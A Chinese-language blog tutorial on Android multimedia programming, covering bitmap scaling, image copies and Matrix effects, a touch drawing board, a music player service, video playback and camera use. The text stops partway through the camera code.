  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/13/09-多媒体编程/" itemprop="url">
                  09 多媒体编程
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T09:45:52+08:00">
                2017-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#一、多媒体概念</p>
<ul>
<li><p>文字、图片、音频、视频<br>##1.1、计算机图片大小的计算</p>
<blockquote>
<p>图片大小 = 图片的总像素 * 每个像素占用的大小</p>
</blockquote>
</li>
<li><p>单色图：每个像素占用1/8个字节</p>
</li>
<li>16色图：每个像素占用1/2个字节</li>
<li>256色图：每个像素占用1个字节</li>
<li>24位图：每个像素占用3个字节<br>##1.2、计算机图片详解</li>
<li>图片的大小 = 图片的像素 * 每个像素占用的大小</li>
<li>单色：只能表示两种颜色<ul>
<li>使用0和1表示黑与白</li>
<li>使用一个长度为1的二进制数字即可表示一个像素的颜色信息</li>
<li>每个像素占用1/8个字节</li>
</ul>
</li>
<li>16色：只能表示16种颜色<ul>
<li>使用16个数字对应这16种颜色</li>
<li>0~15,0000 ~ 1111，也就是说需要长度为4的二进制数字</li>
<li>每个像素占用1/2个字节</li>
</ul>
</li>
<li>256色：只能表示256种颜色<ul>
<li>使用256个数字对应256种颜色</li>
<li>0~255,0000 0000 ~ 1111 1111，也就是说需要长度为8的二进制数字</li>
<li>每个像素占用1个字节</li>
</ul>
</li>
<li>24位色：需要长度为24的二进制数字<ul>
<li>每个像素占用3个字节</li>
<li>R：0~255，占用1个字节</li>
<li>G：同上</li>
<li>B：同上</li>
</ul>
</li>
</ul>
<hr>
<p>#二、加载大图片到内存</p>
<p>###2.1、出现内存溢出问题</p>
<ul>
<li>Android系统以ARGB表示每个像素，所以每个像素占用4个字节，很容易内存溢出</li>
<li>android系统里面每个应用程序默认的vm虚拟机最大的heap空间 16M，如果应用程序占用的内存空间超过了16M  则OOM(out of memory）内存溢出。</li>
</ul>
<p>###2.2 如何解决加载大图片内存溢出问题？</p>
<ul>
<li>手机屏幕的分辨率要比图片的分辨率小很多。 只需要根据手机的分辨率把图片给压缩采样，加载到手机上就行了。步骤：<ol>
<li>计算手机屏幕的宽高</li>
<li>计算图片的宽高</li>
<li>计算图片的缩放比例</li>
<li>opts.inSampleSize = scale; 设置图片的缩放比例</li>
<li>加载图片到内存</li>
</ol>
</li>
<li>具体解析如下：<ul>
<li>Android内存中使用ARGB保存像素信息，每个像素占用4个字节</li>
<li>SD卡中图片像素大小：2400 * 3200 = 7680000</li>
<li>手机的屏幕像素大小：     320 * 480 = 153600</li>
<li>把SD卡图片先缩小，再加载，先计算图片的缩小比例<ul>
<li>2400 / 320 = 7.5</li>
<li>3200 / 480 = 6.67</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>##2.1对图片进行缩放</p>
<ul>
<li><p>获取屏幕宽高</p>
<pre><code>//Display类提供关于屏幕尺寸和分辨率的信息。
Display dp = getWindowManager().getDefaultDisplay();
//获取屏幕的宽度尺寸，以像素为单位。(不建议使用，请使用getSize(Point) 代替)
int screenWidth = dp.getWidth();
//获取屏幕的高度尺寸，以像素为单位。(不建议使用，请使用getSize(Point) 代替)
int screenHeight = dp.getHeight();
</code></pre></li>
<li><p>获取图片宽高 ????????????</p>
<pre><code>//创建请求权对象
Options opts = new Options();
//请求图片属性但不申请内存，//不解析像素信息，只解析图片宽高，那么就不会申请内存去保存像素信息
opts.inJustDecodeBounds = true;
//api会解析图片的所有像素信息，把像素信息保存在内存中
BitmapFactory.decodeFile(&quot;sdcard/dog.jpg&quot;, opts);
//获取图片宽高
int imageWidth = opts.outWidth;
int imageHeight = opts.outHeight;
</code></pre></li>
<li><p>图片的宽高除以屏幕宽高，算出宽和高的缩放比例，取较大值作为图片的缩放比例</p>
<pre><code>//计算缩小比例
int scale = 1;
int scaleX = imageWidth / screenWidth;
int scaleY = imageHeight / screenHeight;
//取较大值
if(scaleX &gt;= scaleY &amp;&amp; scaleX &gt; 1){
    scale = scaleX;
}
else if(scaleY &gt; scaleX &amp;&amp; scaleY &gt; 1){
    scale = scaleY;
}
</code></pre></li>
<li><p>按缩放比例加载图片</p>
<pre><code>//设置缩放比例
opts.inSampleSize = scale;
//为图片申请内存
opts.inJustDecodeBounds = false;
//按照缩小后的比例来解析像素
Bitmap bm = BitmapFactory.decodeFile(&quot;sdcard/dog.jpg&quot;, opts);

//查找并初始化图片控件
ImageView iv = (ImageView) findViewById(R.id.iv);
//为图片重新添加内容
iv.setImageBitmap(bm);
</code></pre></li>
</ul>
<p>–加载图片到内存，并显示在手机桌面上的示例–<br>    public class MainActivity extends Activity {</p>
<pre><code>    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void click(View v){
        Options opts = new Options();
        //不解析像素信息，只解析图片宽高，那么就不会申请内存去保存像素信息
        opts.inJustDecodeBounds = true;
        //api会解析图片的所有像素信息，把像素信息保存在内存中
        BitmapFactory.decodeFile(&quot;sdcard/dog.jpg&quot;, opts);

        //获取图片宽高
        int imageWidth = opts.outWidth;
        int imageHeight = opts.outHeight;

        //获取屏幕宽高
        Display dp = getWindowManager().getDefaultDisplay();
        @SuppressWarnings(&quot;deprecation&quot;)
        int screenWidth = dp.getWidth();
        int screenHeight = dp.getHeight();

        //计算缩小比例
        int scale = 1;
        int scaleWidth = imageWidth / screenWidth;
        int scaleHeight = imageHeight / screenHeight;

        //取较大值
        if(scaleWidth &gt;= scaleHeight &amp;&amp; scaleWidth &gt; 1){
            scale = scaleWidth;
        }
        else if(scaleWidth &lt; scaleHeight &amp;&amp; scaleHeight &gt; 1){
            scale = scaleHeight;
        }

        //设置缩放比例
        opts.inSampleSize = scale;
        //为图片申请内存
        opts.inJustDecodeBounds = false;
        //按照缩小后的比例来解析像素
        Bitmap bm = BitmapFactory.decodeFile(&quot;sdcard/dog.jpg&quot;, opts);

        ImageView iv = (ImageView) findViewById(R.id.iv);
        iv.setImageBitmap(bm);
    }
}
</code></pre><hr>
<p>#三、在内存中创建图片的副本</p>
<blockquote>
<p>直接加载的bitmap对象是只读的，无法修改，要修改图片只能在内存中创建出一个一模一样的bitmap副本，然后修改副本</p>
</blockquote>
<pre><code>//加载SD卡中的原图到内存,注意选个小的，不要内存溢出这个对象是只读的
Bitmap srcBm = BitmapFactory.decodeFile(&quot;sdcard/photo3.jpg&quot;);
//通过图片控件将原图显示到桌面，这个对象是只读的。
iv_src.setImageBitmap(srcBm);

//创建与原图大小一致的空白bitmap
Bitmap copyBm = Bitmap.createBitmap(srcBm.getWidth(), srcBm.getHeight(), srcBm.getConfig());
//定义画笔
Paint paint = new Paint();
//把纸铺在画版上
Canvas canvas = new Canvas(copyBm);
//把srcBm的内容绘制在copyBm上
canvas.drawBitmap(srcBm, new Matrix(), paint);

//将副本图片通过图片控件显示到桌面，这个对象是可读写的。
iv_copy.setImageBitmap(copyBm);
</code></pre><p>–创建图片副本示例–</p>
<pre><code>public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //这个对象是只读的
        Bitmap bmSrc = BitmapFactory.decodeResource(getResources(), R.drawable.photo3);

        //1.创建与原图大小一致的bitmap对象，相当于创建了与原图大小一致的白纸
        Bitmap bmCopy = Bitmap.createBitmap(bmSrc.getWidth(), bmSrc.getHeight(), bmSrc.getConfig());
        //2.创建画笔对象
        Paint paint = new Paint();
        //3.创建画板对象，把白纸铺在画板上
        Canvas canvas = new Canvas(bmCopy);
        //4.开始作画，把原图内容画到白纸上
        canvas.drawBitmap(bmSrc, new Matrix(), paint);

        ImageView iv_src = (ImageView) findViewById(R.id.iv_src);
        iv_src.setImageBitmap(bmSrc);
        ImageView iv_copy = (ImageView) findViewById(R.id.iv_copy);
        iv_copy.setImageBitmap(bmCopy);
    }
}
</code></pre><p>##3.1对图片进行特效处理</p>
<ul>
<li><p>首先定义一个矩阵对象</p>
<pre><code>Matrix mt = new Matrix();
</code></pre></li>
<li><p>缩放效果</p>
<pre><code>//x轴缩放1倍，y轴缩放0.5倍
mt.setScale(1, 0.5f);

mt.setScale(2.0f, 2.0f);
</code></pre></li>
<li><p>旋转效果</p>
<pre><code>//以副本图片为轴点，顺时旋转30度

mt.setRotate(30,copyBm.getWidth()/2, copyBm.getHeight()/2);
</code></pre></li>
<li><p>平移</p>
<pre><code>//x轴坐标+10，y轴坐标+20
mt.setTranslate(10, 20);
</code></pre></li>
<li><p>镜面</p>
<pre><code>//把X坐标都变成负数
mt.setScale(-1, 1);
//matrix.setScale(-1.0f, 1);
//图片整体向右移
mt.postTranslate(copyBm.getWidth(), 0);
</code></pre></li>
<li><p>倒影</p>
<pre><code>//把Y坐标都变成负数
mt.setScale(1, -1);
//图片整体向下移
mt.postTranslate(0, copyBm.getHeight());
</code></pre></li>
</ul>
<p>–图片特效示例–</p>
<pre><code>public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //这个对象是只读的
        Bitmap bmSrc = BitmapFactory.decodeResource(getResources(), R.drawable.photo3);

        //1.创建与原图大小一致的bitmap对象，相当于创建了与原图大小一致的白纸
        Bitmap bmCopy = Bitmap.createBitmap(bmSrc.getWidth(), bmSrc.getHeight(), bmSrc.getConfig());
        //2.创建画笔对象
        Paint paint = new Paint();
        //3.创建画板对象，把白纸铺在画板上
        Canvas canvas = new Canvas(bmCopy);
        //4.开始作画，把原图内容画到白纸上

        //4.1对图片进行特效处理
        //首先定义一个矩阵对象
        Matrix mt = new Matrix();
        //平移
        //mt.setTranslate(10, 20);

        //缩放
        //mt.setScale(0.5f,2);
        //mt.setScale(0.5f,2, bmCopy.getWidth()/2, bmCopy.getHeight()/2);

        //旋转
        //mt.setRotate(45,bmCopy.getWidth()/2, bmCopy.getHeight()/2);


        //镜面
        //mt.setScale(-1, 1); 
        //mt.postTranslate(bmCopy.getWidth(), 0);
        //倒影
        mt.setScale(1, -1);
        mt.postTranslate(0, bmCopy.getHeight());

        //4.2 把原图内容画到白纸上
        canvas.drawBitmap(bmSrc, mt, paint);

        ImageView iv_src = (ImageView) findViewById(R.id.iv_src);
        iv_src.setImageBitmap(bmSrc);
        ImageView iv_copy = (ImageView) findViewById(R.id.iv_copy);
        iv_copy.setImageBitmap(bmCopy);
    }
}
</code></pre><hr>
<p>#四、画画板,在图片副本上进行读写操作</p>
<p>###4.1、实现功能：记录用户触摸事件的XY坐标，绘制直线</p>
<ul>
<li><p>1、在手机屏幕上加载图片副本</p>
<pre><code>//1将原画加载到内存
Bitmap bmSrc = BitmapFactory.decodeResource(getResources(), R.drawable.bg);
//2在内存中创建图片的副本
bmCopy = Bitmap.createBitmap(bmSrc.getWidth(), bmSrc.getHeight(), bmSrc.getConfig());
paint = new Paint();
canvas = new Canvas(bmCopy);
//作画
canvas.drawBitmap(bmSrc, new Matrix(), paint);
//3将副本图片显示在桌面上
iv = (ImageView) findViewById(R.id.iv);
iv.setImageBitmap(bmCopy);
</code></pre></li>
<li><p>2、给ImageView图片副本设置触摸侦听，得到用户的触摸事件，并获知用户触摸ImageView的坐标，实现在副本图片上划线</p>
<pre><code>iv.setOnTouchListener(new OnTouchListener() {

    @Override
    public boolean onTouch(View v, MotionEvent event) {
        // TODO Auto-generated method stub
        switch (event.getAction()) {//判断手指触屏事件
        //触摸屏幕
        case MotionEvent.ACTION_DOWN:
            //得到触摸屏幕时手指的坐标
            startX = (int) event.getX();
            startY = (int) event.getY();
            break;
        //在屏幕上滑动
        case MotionEvent.ACTION_MOVE:
            //用户滑动手指，坐标不断的改变，获取最新坐标
            int newX = (int) event.getX();
            int newY = (int) event.getY();
            //用上次onTouch方法得到的坐标和本次得到的坐标绘制直线
            canvas.drawLine(startX, startY, newX, newY, paint);
            //刷新桌面图片
            iv.setImageBitmap(copyBm);
            //改变每次画线的开始坐标
            startX = newX;
            startY = newY;
            break;
        }
        //该触摸事件是否由此侦听处理
        return true;
    }
});
</code></pre></li>
<li><p>刷子效果，加粗画笔</p>
<pre><code>public void flush(View v){
    paint.setStrokeWidth(8);
}
</code></pre></li>
<li><p>调色板，改变画笔颜色</p>
<pre><code>public void green(View v){
    paint.setColor(Color.GREEN);
}
</code></pre></li>
<li><p>保存图片至SD卡</p>
<pre><code>public void save(View v){
    File file = new File(&quot;sdcard/dazuo2.png&quot;);
    FileOutputStream fos;
    try {
        fos = new FileOutputStream(file);
        //保存
        bmCopy.compress(CompressFormat.PNG, 100, fos);
    } catch (FileNotFoundException e) {
        e.printStackTrace();
    }

    //发送sd卡就绪广播，触发sd卡的遍历
    Intent intent = new Intent();
    intent.setAction(Intent.ACTION_MEDIA_MOUNTED);
    intent.setData(Uri.fromFile(Environment.getExternalStorageDirectory()));
    sendBroadcast(intent);
}
</code></pre></li>
<li>系统每次收到SD卡就绪广播时，都会去遍历sd卡的所有文件和文件夹，把遍历到的所有多媒体文件都在MediaStore数据库保存一个索引，这个索引包含多媒体文件的文件名、路径、大小</li>
<li><p>图库每次打开时，并不会去遍历sd卡获取图片，而是通过内容提供者从MediaStore数据库中获取图片的信息，然后读取该图片</p>
</li>
<li><p>系统开机或者点击加载sd卡按钮时，系统会发送sd卡就绪广播，我们也可以手动发送就绪广播</p>
<pre><code>Intent intent = new Intent();
intent.setAction(Intent.ACTION_MEDIA_MOUNTED);
intent.setData(Uri.fromFile(Environment.getExternalStorageDirectory()));
sendBroadcast(intent);
</code></pre></li>
</ul>
<hr>
<p>#五、撕衣服</p>
<ul>
<li>原理：把穿内衣和穿外衣的照片重叠显示，内衣照在下面，用户滑动屏幕时，触摸的是外衣照，把手指经过的像素都置为透明，内衣照就显示出来了</li>
<li>步骤：</li>
<li>1.相对布局 外衣图片与内衣图片重叠，内衣上外衣下</li>
<li>2.在手机屏幕上加载外衣原画，并显示外衣图片副本</li>
<li><p>3.设置触摸侦听，移动的位置颜色变透明，</p>
<pre><code>//初始化外衣图片控件
iv = (ImageView) findViewById(R.id.iv);
//为图片控件设置触摸侦听
iv.setOnTouchListener(new OnTouchListener() {

    @Override
    public boolean onTouch(View v, MotionEvent event) {
        // TODO Auto-generated method stub
        switch (event.getAction()) {//判断手指触屏事件
        //手指在屏幕上滑动时
        case MotionEvent.ACTION_MOVE:
            //得到相对图片的坐标
            int x = (int) event.getX();
            int y = (int) event.getY();
            //设置坐标方圆5像素都变为透明
            for (int i = -5; i &lt; 5; i++) {
                for (int j = -5; j &lt; 5; j++) {
                    if(Math.sqrt(i*i + j*j) &lt;= 5){
                        //把指定坐标的像素置为指定颜色
                        if(x + i &lt; bmCopy.getWidth() &amp;&amp; x + i &gt;= 0 &amp;&amp; y + j &lt; bmCopy.getHeight() &amp;&amp; y + j &gt;= 0){
                            bmCopy.setPixel(x + i, y + j, Color.TRANSPARENT);
                            iv.setImageBitmap(bmCopy);
                        }
                    }
                }
            }
            break;
        }
        return true;
    }
});
</code></pre></li>
<li><p>每次只设置一个像素点太慢，以触摸的像素为圆心，半径为5画圆，圆内的像素全部置为透明</p>
<pre><code>for (int i = -5; i &lt; 6; i++) {
    for (int j = -5; j &lt; 6; j++) {
        if(Math.sqrt(i * i + j * j) &lt;= 5)
            copyBm.setPixel(newX + i, newY + j, Color.TRANSPARENT);
    }
}
</code></pre></li>
</ul>
<hr>
<p>#六、音乐播放器</p>
<p>##6.1播放服务</p>
<ul>
<li>1.创建音乐服务（播放音频的代码应该运行在服务中，定义一个播放服务MusicService）</li>
<li><p>1.1 MusicService服务里定义play、stop、pause、continuePlay等方法</p>
<pre><code>//定义媒体播放器(MediaPlayer)控件的视图，此视图包含了一些典型的按钮，像&quot;播放(Play)/暂停(Pause)&quot;, &quot;倒带(Rewind)&quot;, &quot;快进(Fast Forward)&quot;与进度滑动器(progress slider)。

//媒体播放器在服务启动时，就要被创建，要提全局
MediaPlayer player;
@Override
public void onCreate() {
    super.onCreate();
    player = new MediaPlayer();

}

//服务内部定义开始音乐功能，
private void play() {
    //重置，进入空闲状态
    player.reset();
    try {
        //设置音频文件来源，进入初始化状态
        player.setDataSource(&quot;sdcard/bzj.mp3&quot;);
        //player.setDataSource(&quot;http://192.168.15.77:8080/bzj.mp3&quot;);
        //进入准备状态
        //player.prepare();
        //异步准备
        player.prepareAsync();
        //异步准备需要设置准备侦听,准备好就开始播放
        player.setOnPreparedListener(new OnPreparedListener() {

            @Override
            public void onPrepared(MediaPlayer mp) {
                //开始播放
                player.start();
                addTimer();
            }
        });

    } catch (Exception e) {
        e.printStackTrace();
    } 
}

//服务内部定义暂停音乐功能
private void pause() {
    player.pause();
}

private void stop() {
    player.stop();
}

//服务内部定义继续音乐功能
private void continuePlay() {
    player.start();
}
</code></pre></li>
<li><p>1.2 把play、stop、pause、continuePlay等方法这几个方法抽取成一个接口MusicInterface</p>
<pre><code>public interface MusicControllerInterface {

    void play();
    void pause();
    void continuePlay();
    void seekTo(int progress);
}
</code></pre></li>
<li><p>1.3 服务中定义一个中间人类，继承Binder，实现MusicInterface</p>
<pre><code>class MusicController extends Binder implements MusicControllerInterface{

    @Override
    public void play() {
        MusicService.this.play();

    }

    @Override
    public void pause() {
        MusicService.this.pause();
    }

    @Override
    public void continuePlay() {
        MusicService.this.continuePlay();

    }

    @Override
    public void seekTo(int progress) {
        MusicService.this.seekTo(progress);
    }
}
</code></pre></li>
<li><p>1.4 为音乐服务进行清单配置</p>
<pre><code>&lt;service android:name=&quot;com.itheima.musicplayer.MusicService&quot;&gt;&lt;/service&gt;
</code></pre></li>
<li><ol>
<li><p>Activity界面中混合启动startService服务（启动MusicService服务，再bind服务）</p>
<pre><code>//UI界面已启动，执行此方法
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    //启动音乐服务意图（很显然是显示启动）
    Intent intent = new Intent(this, MusicService.class);
    //创建通讯频道对象，将用与获取中间人
    MusicConnection conn = new MusicConnection();

    sb = (SeekBar) findViewById(R.id.sb);
    sb.setOnSeekBarChangeListener(new OnSeekBarChangeListener() {

        //停止划动
        @Override
        public void onStopTrackingTouch(SeekBar seekBar) {
            //获取用户停止划动后的进度
            int progress = seekBar.getProgress();
            //改变音乐播放进度
            mci.seekTo(progress);
        }
        //开始划动
        @Override
        public void onStartTrackingTouch(SeekBar seekBar) {
        }

        //正在划动
        @Override
        public void onProgressChanged(SeekBar seekBar, int progress,
                boolean fromUser) {
        }
    });

    //------------------------------------------
    //混合启动
    //start是为了让进程变成服务进程
    startService(intent);
    //bind是为了拿到中间人对象
    bindService(intent, conn, BIND_AUTO_CREATE);
}
</code></pre></li>
</ol>
</li>
</ul>
<p>##6.2根据播放进度设置进度条</p>
<ul>
<li><p>获取当前的播放时间和当前音频的最长时间</p>
<pre><code>int currentPosition = player.getCurrentPosition();
int duration = player.getDuration();
</code></pre></li>
<li>播放进度需要不停的获取，不停的刷新进度条，使用计时器每500毫秒获取一次播放进度</li>
<li><p>发消息至Handler，把播放进度放进Message对象中，在Handler中更新SeekBar的进度</p>
<pre><code>Timer timer = new Timer();
timer.schedule(new TimerTask() {

    @Override
    public void run() {

        //获取歌曲当前播放的时间点
        int currentPosition = player.getCurrentPosition();
        //获取歌曲总时长
        int duration = player.getDuration();
        //获取消息对象
        //Message msg = Message.obtain();
        Message msg =MainActivity.handler.obtainMessage();
        //把播放进度存入Message中
        Bundle data = new Bundle();
        data.putInt(&quot;currentPosition&quot;, currentPosition);
        data.putInt(&quot;duration&quot;, duration);
        msg.setData(data);
        // 将消息发送到消息队列
        MainActivity.handler.sendMessage(msg);
    }
}, 5, 500);
</code></pre></li>
<li><p>在Activity中定义Handler</p>
<pre><code>static Handler handler = new Handler(){
    public void handleMessage(android.os.Message msg) {
        //取出消息携带的数据
        Bundle data = msg.getData();
        int currentPosition = data.getInt(&quot;currentPosition&quot;);
        int duration = data.getInt(&quot;duration&quot;);

        //设置播放进度
        sb.setMax(duration);
        sb.setProgress(currentPosition);
    };
};
</code></pre></li>
</ul>
<p>##6.3拖动进度条改变播放进度</p>
<ul>
<li><p>1.在UI界面获取进度条控件，并对其设置拖动侦听，调用服务里的改变音乐播放进度方法(把进度参数传过去)</p>
<pre><code> //初始化SeekBar音乐滚动条
 sb = (SeekBar) findViewById(R.id.sb);
 //给sb设置一个拖动侦听
 sb.setOnSeekBarChangeListener(new OnSeekBarChangeListener() {
    //停止拖动时调用
    @Override
    public void onStopTrackingTouch(SeekBar seekBar) {
        //获取用户停止划动后的进度
        int progress = seekBar.getProgress();
        //改变音乐播放进度，调用音乐服务抽取出来的接口方法，去改变音乐播放进度
        mci.seekTo(progress);
    }
    //开始拖动时调用            
    @Override
    public void onStartTrackingTouch(SeekBar seekBar) {

    }
    //拖动的时候不断调用            
    @Override
    public void onProgressChanged(SeekBar seekBar, int progress,
            boolean fromUser) {

    }
});    
</code></pre></li>
<li><p>2.定义方法：在音乐服务中定义根据进度参数改变音乐播放进度的方法</p>
<pre><code>public void seekTo(int progress){
    player.seekTo(progress);
}
</code></pre></li>
</ul>
<hr>
<p>#七、视频播放器</p>
<p>##7.1SurfaceView</p>
<ul>
<li>对画面的实时更新要求较高</li>
<li>双缓冲技术：内存中有两个画布，A画布显示至屏幕，B画布在内存中绘制下一帧画面，绘制完毕后B显示至屏幕，A在内存中继续绘制下一帧画面</li>
<li><p>播放视频也是用MediaPlayer，不过跟音频不同，要设置显示在哪个SurfaceView</p>
<pre><code>SurfaceView sv = (SurfaceView) findViewById(R.id.sv);
SurfaceHolder sh = sv.getHolder();

MediaPlayer player = new MediaPlayer();
player.reset();
try {
    player.setDataSource(&quot;sdcard/2.3gp&quot;);
    player.setDisplay(sh);
    player.prepare();
} catch (Exception e) {
    e.printStackTrace();
}
player.start();
</code></pre></li>
<li>SurfaceView是重量级组件，可见时才会创建</li>
<li><p>给SurfaceHolder设置CallBack，类似于侦听，可以知道SurfaceView的状态</p>
<pre><code>//看做侦听，可以知道SurfaceView的状态，并执行相对应方法
sh.addCallback(new Callback() {
    //SurfaceView一旦不可见，就会被销毁,SurfaceView销毁时调用
    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        // TODO Auto-generated method stub

    }
    //SurfaceView一旦可见，就会被创建SurfaceView创建时调用
    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        // TODO Auto-generated method stub

    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width,
            int height) {
        // TODO Auto-generated method stub

    }
});
</code></pre></li>
<li>SurfaceView一旦不可见，就会被销毁，一旦可见，就会被创建，销毁时停止播放，再次创建时再开始播放</li>
</ul>
<p>–视频播放器示例</p>
<pre><code>public class MainActivity extends Activity {

    private MediaPlayer player;
    int progress = 0;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //获取显示视频的控件
        SurfaceView sv = (SurfaceView) findViewById(R.id.sv);
        //获取控制器
        final SurfaceHolder holder = sv.getHolder();

//        Thread t = new Thread(){
//            @Override
//            public void run() {
//                try {
//                    sleep(200);
//                } catch (InterruptedException e) {
//                    // TODO Auto-generated catch block
//                    e.printStackTrace();
//                }
//                
//                runOnUiThread(new Runnable() {
//                    
//                    @Override
//                    public void run() {
//                        MediaPlayer player = new MediaPlayer();
//                        player.reset();
//                        try {
//                            player.setDataSource(&quot;sdcard/2.3gp&quot;);
//                            //指定视频画面播放在哪个组件
//                            player.setDisplay(holder);
//                            player.prepare();
//                            player.start();
//                        } catch (Exception e) {
//                            // TODO Auto-generated catch block
//                            e.printStackTrace();
//                        } 
//                        
//                    }
//                });
//            }
//        };
//        t.start();

        //给SurfaceHolder设置CallBack，类似于侦听，可以知道SurfaceView的状态
        holder.addCallback(new Callback() {

            //SurfaceView摧毁时调用
            @Override
            public void surfaceDestroyed(SurfaceHolder holder) {
                if(player != null){
                    //每次SurfaceView摧毁时记录播放进度
                    progress = player.getCurrentPosition();
                    player.stop();
                    player.release();
                    player = null;
                }
            }

            //SurfaceView创建时调用
            @Override
            public void surfaceCreated(SurfaceHolder holder) {
                if(player == null){
                    player = new MediaPlayer();
                    player.reset();
                    try {
                        //指定要播放的资源
                        player.setDataSource(&quot;sdcard/2.3gp&quot;);
                        //指定视频画面播放在哪个组件
                        player.setDisplay(holder);
                        //进入准备状态
                        player.prepare();
                        //跳到先前的进度
                        player.seekTo(progress);
                        //开始播放
                        player.start();
                    } catch (Exception e) {
                        e.printStackTrace();
                    } 
                }
            }

            //SurfaceView结构改变时调用
            @Override
            public void surfaceChanged(SurfaceHolder holder, int format, int width,
                    int height) {
                // TODO Auto-generated method stub
            }
        });
    }
}
</code></pre><p>##7.2 VideoView 使用方法简单播放视频</p>
<pre><code>public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        VideoView vv = (VideoView) findViewById(R.id.vv);
        vv.setVideoPath(&quot;sdcard/2.3gp&quot;);
        vv.start();
    }
}
</code></pre><hr>
<p>#八、摄像头</p>
<ul>
<li><p>8.1启动系统提供的拍照程序</p>
<pre><code>public void click1(View v){
    //隐式启动系统提供的拍照Activity
    Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
    //设置照片的保存路径
    File file = new File(Environment.getExternalStorageDirectory(), &quot;haha.jpg&quot;); 
    intent.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(file)); 
    //arg1:请求码，用于匹配
    startActivityForResult(intent, 0);
}
</code></pre></li>
<li><p>8.2启动系统提供的摄像程序</p>
<pre><code>public void click2(View v){
    Intent intent = new Intent(MediaStore.ACTION_VIDEO_CAPTURE);
    //设置摄像的保存路径
    File file = new File(Environment.getExternalStorageDirectory(), &quot;haha.3gp&quot;); 
    intent.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(file)); 
    //设置保存视频文件的质量
    intent.putExtra(MediaStore.EXTRA_VIDEO_QUALITY, 1);
    startActivityForResult(intent, 0);
}
</code></pre></li>
<li><p>8.3 启动系统提供的拍照Activity和启动系统提供的摄像Activity示例：</p>
<pre><code>public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void click1(View v){
        //启动系统提供的拍照Activity
        Intent intent = new Intent();    
        intent.setAction(MediaStore.ACTION_IMAGE_CAPTURE);
        intent.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(new File(&quot;sdcard/haha.jpg&quot;)));
        startActivityForResult(intent, 10);//开启拍照并设置请求码
    }
    public void click2(View v){
        //启动系统提供的摄像Activity
        Intent intent = new Intent();    
        intent.setAction(MediaStore.ACTION_VIDEO_CAPTURE);
        intent.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(new File(&quot;sdcard/haha2.3gp&quot;)));
        intent.putExtra(MediaStore.EXTRA_VIDEO_QUALITY, 1);
        startActivityForResult(intent, 20);//开启摄像并设置请求码
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        //判断请求码，进行操作
        if(requestCode == 10){
            Toast.makeText(this, &quot;拍照完成&quot;, 0).show();
        }
        else if(requestCode == 20){
            Toast.makeText(this, &quot;摄像完成&quot;, 0).show();
        }
    }
}
</code></pre></li>
</ul>
<p>#9 Camera照相机</p>
<ul>
<li>1.设置UI界面的Activity</li>
</ul>
<p>public class MainActivity extends Activity {<br>            private static final String TAG = “Camera”;<br>             private Camera mCamera;<br>             private CameraPreview mPreview;</p>
<pre><code>        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);

            if(checkCameraHardware(this)){
                // 创建摄像头实例
                mCamera = getCameraInstance();

                // 创建预览界面
                mPreview = new CameraPreview(this, mCamera);


                FrameLayout preview = (FrameLayout) findViewById(R.id.camera_preview);
                //把SurfaceView设置为帧布局的子节点
                preview.addView(mPreview);

             // 给拍照按钮设置点击侦听
                Button captureButton = (Button) findViewById(R.id.button_capture);
                captureButton.setOnClickListener(
                    new View.OnClickListener() {
                        @Override
                        public void onClick(View v) {
                            //自动对焦
                            mCamera.autoFocus(new AutoFocusCallback() {

                                //自动对焦完成时，此方法调用
                                @Override
                                public void onAutoFocus(boolean success, Camera camera) {
                                    // 拍照
                                    mCamera.takePicture(null, null, mPicture);

                                }
                            });

                        }
                    }
                );
            }
            else{
                Toast.makeText(this, &quot;连摄像头都没有，穷逼&quot;, 0).show();
            }
        }


    /** 检测是否有摄像头 */
    private boolean checkCameraHardware(Context context) {
        //检测是否具有指定的系统功能
        if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){
            // 有摄像头
            return true;
        } else {
            // 没有摄像头
            return false;
        }
    }

    /** 这是一个获取摄像头实例的安全的途径 */
    public static Camera getCameraInstance(){
        Camera c = null;
        try {
            //返回后置摄像头的实例，如果没有后置摄像头，返回空
